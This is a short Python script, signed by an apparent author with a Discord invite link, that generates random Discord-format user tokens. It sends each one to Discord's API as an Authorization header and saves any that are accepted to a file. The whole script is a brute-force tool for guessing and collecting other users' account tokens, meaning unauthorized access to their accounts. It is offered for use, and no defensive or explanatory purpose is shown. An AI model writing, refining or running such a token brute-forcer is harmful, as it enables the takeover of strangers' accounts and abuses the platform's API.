import requests
import secrets

def generate_token():
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    token = ''.join(secrets.choice(alphabet) for i in range(15))
    return f"MTA3MTE2MjE{token}.{''.join(secrets.choice(alphabet) for i in range(6))}.{''.join(secrets.choice(alphabet) for i in range(38))}"

def check_token(token):
    headers = {'Authorization': token}
    url = 'https://discordapp.com/api/v9/users/@me/library'
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return True
    else:
        return False

num_tokens = int(input("How many tokens do you want to generate? : "))
with open('tokens.txt', 'a') as file:
    for i in range(num_tokens):
        token = generate_token()
        if check_token(token):
            print(f"{token} is valid.")
            file.write(token + '\n')
        else:
            print(f"{token} is invalid.")
            
            
            
# ---------Writed By : MoDeW----------
# ---------https://discord.gg/qeFXMbGqt4----------